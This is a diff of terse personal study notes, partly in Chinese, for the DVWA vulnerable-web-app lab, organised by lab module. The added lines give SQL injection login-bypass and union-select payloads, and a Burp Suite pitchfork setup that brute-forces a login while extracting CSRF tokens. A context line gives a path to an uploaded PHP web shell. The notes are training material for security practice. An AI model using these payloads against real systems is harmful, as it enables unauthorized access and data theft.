@@ -4,7 +4,25 @@ https://blog.csdn.net/qq_29277155/article/details/52726730
 
 Brute Force
 	burpsuite
+	
 	admin' or 1=1 limit 1 -- +
+		if( $result && mysqli_num_rows( $result ) == 1 ) {}
+		
+	
+	设置token
+		checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+		
+		pitchfork
+			username=admin&password=§222§&Login=Login&user_token=§953e9335f5805d86b6926df5b2df52e7§ HTTP/1.1
+			
+		request engine -> number threads -> 1
+		grep match -> welcome
+		grep extract -> From [ value='] to [' />\r\n\x09\x09</form>]    //taken
+		redirections -> always
+		
+		recursive grep 递归搜索
+	
+	if( ( $data->rowCount() == 1 ) && ( $row[ 'failed_login' ] >= $total_failed_login ) )  {}
 	
 Command Injection
 	127.0.0.1
@@ -27,7 +45,10 @@ File Upload
 	http://1.117.162.201/dvwa/hackable/uploads/1.php
 
 Insecure CAPTCHA
+
 SQL Injection
+	2" or 1=1 -- +
+	1' union all select @@datadir,@@basedir#
 SQL Injection (Blind)
 Weak Session IDs
 XSS (DOM)
